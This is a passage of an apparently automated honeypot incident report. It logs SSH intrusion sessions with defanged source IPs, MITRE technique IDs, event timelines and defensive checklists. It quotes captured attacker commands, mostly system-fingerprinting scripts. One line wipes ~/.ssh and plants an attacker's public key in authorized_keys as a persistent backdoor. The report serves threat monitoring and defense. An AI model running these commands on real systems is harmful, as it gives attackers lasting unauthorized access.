| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:21:14` | `cowrie.session.connect` |
| `2026-07-22 05:21:14` | `cowrie.client.version` |
| `2026-07-22 05:21:15` | `cowrie.client.kex` |
| `2026-07-22 05:21:15` | `cowrie.login.success` |
| `2026-07-22 05:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f532dfb2ab03

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:22 |
| **Last Seen** | 2026-07-22 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:22:09` | `cowrie.session.connect` |
| `2026-07-22 05:22:09` | `cowrie.client.version` |
| `2026-07-22 05:22:09` | `cowrie.client.kex` |
| `2026-07-22 05:22:09` | `cowrie.login.success` |
| `2026-07-22 05:22:10` | `cowrie.session.params` |
| `2026-07-22 05:22:10` | `cowrie.command.input` |
| `2026-07-22 05:22:10` | `cowrie.log.closed` |
| `2026-07-22 05:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bbffd6065c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:22 |
| **Last Seen** | 2026-07-22 05:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:22:52` | `cowrie.session.connect` |
| `2026-07-22 05:22:53` | `cowrie.client.version` |
| `2026-07-22 05:22:53` | `cowrie.client.kex` |
| `2026-07-22 05:22:54` | `cowrie.login.success` |
| `2026-07-22 05:22:56` | `cowrie.session.params` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.success` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.command.input` |
| `2026-07-22 05:22:56` | `cowrie.log.closed` |
| `2026-07-22 05:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa367fd9dc43

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:24 |
| **Last Seen** | 2026-07-22 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:24:26` | `cowrie.session.connect` |
| `2026-07-22 05:24:26` | `cowrie.client.version` |
| `2026-07-22 05:24:26` | `cowrie.client.kex` |
| `2026-07-22 05:24:26` | `cowrie.login.success` |
| `2026-07-22 05:24:27` | `cowrie.session.params` |
| `2026-07-22 05:24:27` | `cowrie.command.input` |
| `2026-07-22 05:24:27` | `cowrie.log.closed` |
| `2026-07-22 05:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a0b797c02d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:24 |
| **Last Seen** | 2026-07-22 05:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:24:44` | `cowrie.session.connect` |
| `2026-07-22 05:24:44` | `cowrie.client.version` |
| `2026-07-22 05:24:44` | `cowrie.client.kex` |
| `2026-07-22 05:24:46` | `cowrie.login.success` |
| `2026-07-22 05:24:48` | `cowrie.session.params` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.success` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.command.input` |
| `2026-07-22 05:24:48` | `cowrie.log.closed` |
| `2026-07-22 05:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed28b811d445

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-07-22 05:26 |
| **Last Seen** | 2026-07-22 05:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:26:25` | `cowrie.session.connect` |
| `2026-07-22 05:26:25` | `cowrie.client.version` |
| `2026-07-22 05:26:25` | `cowrie.client.kex` |
| `2026-07-22 05:26:26` | `cowrie.login.success` |
| `2026-07-22 05:26:26` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f897646929be

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:26 |
| **Last Seen** | 2026-07-22 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:26:34` | `cowrie.session.connect` |
| `2026-07-22 05:26:34` | `cowrie.client.version` |
| `2026-07-22 05:26:34` | `cowrie.client.kex` |
| `2026-07-22 05:26:34` | `cowrie.login.success` |
| `2026-07-22 05:26:35` | `cowrie.session.params` |
| `2026-07-22 05:26:35` | `cowrie.command.input` |
| `2026-07-22 05:26:35` | `cowrie.log.closed` |
| `2026-07-22 05:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030665c49d43

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:26 |
| **Last Seen** | 2026-07-22 05:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:26:37` | `cowrie.session.connect` |
| `2026-07-22 05:26:37` | `cowrie.client.version` |
| `2026-07-22 05:26:37` | `cowrie.client.kex` |
| `2026-07-22 05:26:39` | `cowrie.login.success` |
| `2026-07-22 05:26:40` | `cowrie.session.params` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.success` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:40` | `cowrie.command.input` |
| `2026-07-22 05:26:41` | `cowrie.log.closed` |
| `2026-07-22 05:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c5372d312c

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-07-22 05:28 |
| **Last Seen** | 2026-07-22 05:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:28:08` | `cowrie.session.connect` |
| `2026-07-22 05:28:08` | `cowrie.client.version` |
| `2026-07-22 05:28:08` | `cowrie.client.kex` |
| `2026-07-22 05:28:09` | `cowrie.login.success` |
| `2026-07-22 05:28:10` | `cowrie.session.params` |
| `2026-07-22 05:28:10` | `cowrie.command.input` |
| `2026-07-22 05:28:10` | `cowrie.command.failed` |
| `2026-07-22 05:28:11` | `cowrie.log.closed` |
| `2026-07-22 05:28:12` | `cowrie.session.params` |
| `2026-07-22 05:28:12` | `cowrie.command.input` |
| `2026-07-22 05:28:12` | `cowrie.session.file_download` |
| `2026-07-22 05:28:12` | `cowrie.log.closed` |
| `2026-07-22 05:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-644ff4be2fc1

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-07-22 05:28 |
| **Last Seen** | 2026-07-22 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:28:12` | `cowrie.session.connect` |
| `2026-07-22 05:28:12` | `cowrie.client.version` |
| `2026-07-22 05:28:13` | `cowrie.client.kex` |
| `2026-07-22 05:28:14` | `cowrie.login.success` |
| `2026-07-22 05:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9715f8c3b932

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-07-22 05:28 |
| **Last Seen** | 2026-07-22 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:28:14` | `cowrie.session.connect` |
| `2026-07-22 05:28:14` | `cowrie.client.version` |
| `2026-07-22 05:28:15` | `cowrie.client.kex` |
| `2026-07-22 05:28:16` | `cowrie.login.success` |
| `2026-07-22 05:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498e13bf89e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:28 |
| **Last Seen** | 2026-07-22 05:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:28:30` | `cowrie.session.connect` |
| `2026-07-22 05:28:30` | `cowrie.client.version` |
| `2026-07-22 05:28:30` | `cowrie.client.kex` |
| `2026-07-22 05:28:31` | `cowrie.login.success` |
| `2026-07-22 05:28:33` | `cowrie.session.params` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.success` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.command.input` |
| `2026-07-22 05:28:33` | `cowrie.log.closed` |
| `2026-07-22 05:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514d037739f3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:28 |
| **Last Seen** | 2026-07-22 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:28:43` | `cowrie.session.connect` |
| `2026-07-22 05:28:43` | `cowrie.client.version` |
| `2026-07-22 05:28:43` | `cowrie.client.kex` |
| `2026-07-22 05:28:44` | `cowrie.login.success` |
| `2026-07-22 05:28:45` | `cowrie.session.params` |
| `2026-07-22 05:28:45` | `cowrie.command.input` |
| `2026-07-22 05:28:45` | `cowrie.log.closed` |
| `2026-07-22 05:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0313c3819df

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-22 05:28 |
| **Last Seen** | 2026-07-22 05:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:28:48` | `cowrie.session.connect` |
| `2026-07-22 05:28:49` | `cowrie.client.version` |
| `2026-07-22 05:28:49` | `cowrie.client.kex` |
| `2026-07-22 05:28:50` | `cowrie.login.success` |
| `2026-07-22 05:28:50` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c879069c0cef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:30 |
| **Last Seen** | 2026-07-22 05:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:30:16` | `cowrie.session.connect` |
| `2026-07-22 05:30:16` | `cowrie.client.version` |
| `2026-07-22 05:30:16` | `cowrie.client.kex` |
| `2026-07-22 05:30:18` | `cowrie.login.success` |
| `2026-07-22 05:30:20` | `cowrie.session.params` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.success` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.command.input` |
| `2026-07-22 05:30:20` | `cowrie.log.closed` |
| `2026-07-22 05:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a6baf9ac06

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:31 |
| **Last Seen** | 2026-07-22 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:31:12` | `cowrie.session.connect` |
| `2026-07-22 05:31:12` | `cowrie.client.version` |
| `2026-07-22 05:31:12` | `cowrie.client.kex` |
| `2026-07-22 05:31:13` | `cowrie.login.success` |
| `2026-07-22 05:31:13` | `cowrie.session.params` |
| `2026-07-22 05:31:13` | `cowrie.command.input` |
| `2026-07-22 05:31:13` | `cowrie.log.closed` |
| `2026-07-22 05:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76a991263fb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:32 |
| **Last Seen** | 2026-07-22 05:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:32:03` | `cowrie.session.connect` |
| `2026-07-22 05:32:03` | `cowrie.client.version` |
| `2026-07-22 05:32:03` | `cowrie.client.kex` |
| `2026-07-22 05:32:05` | `cowrie.login.success` |
| `2026-07-22 05:32:06` | `cowrie.session.params` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.success` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:06` | `cowrie.command.input` |
| `2026-07-22 05:32:07` | `cowrie.log.closed` |
| `2026-07-22 05:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9e9293f114

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:33 |
| **Last Seen** | 2026-07-22 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:33:11` | `cowrie.session.connect` |
| `2026-07-22 05:33:11` | `cowrie.client.version` |
| `2026-07-22 05:33:11` | `cowrie.client.kex` |
| `2026-07-22 05:33:11` | `cowrie.login.success` |
| `2026-07-22 05:33:12` | `cowrie.session.params` |
| `2026-07-22 05:33:12` | `cowrie.command.input` |
| `2026-07-22 05:33:12` | `cowrie.log.closed` |
| `2026-07-22 05:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b36214cc561

| Field | Detail |
|---|---|
| **Source IP** | `51.178.142[.]35` |
| **First Seen** | 2026-07-22 05:33 |
| **Last Seen** | 2026-07-22 05:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
